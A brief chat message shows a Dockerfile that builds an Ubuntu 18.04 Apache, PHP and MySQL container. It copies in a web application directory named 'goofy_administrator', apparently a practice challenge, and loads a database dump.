[송민영] [오전 2:33] ❯ cat Dockerfile
FROM ubuntu:18.04
MAINTAINER koharin

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update -y
RUN apt-get install -y apache2 php libapache2-mod-php mysql-server

ENV APACHE_RUN_USER www-data
ENV APACHE_RUN_GROUP www-data 

ADD ./prob /var/www/html/goofy_administrator 
ADD ./goofy-db/db.sql /mysql/
RUN service mysql start && mysql < /mysql/db.sql 

RUN rm /var/www/html/index.html 
WORKDIR /var/www/html/goofy_administrator 
EXPOSE 80

CMD ["/usr/sbin/apache2ctl", "-D", "FOREGROUND"]
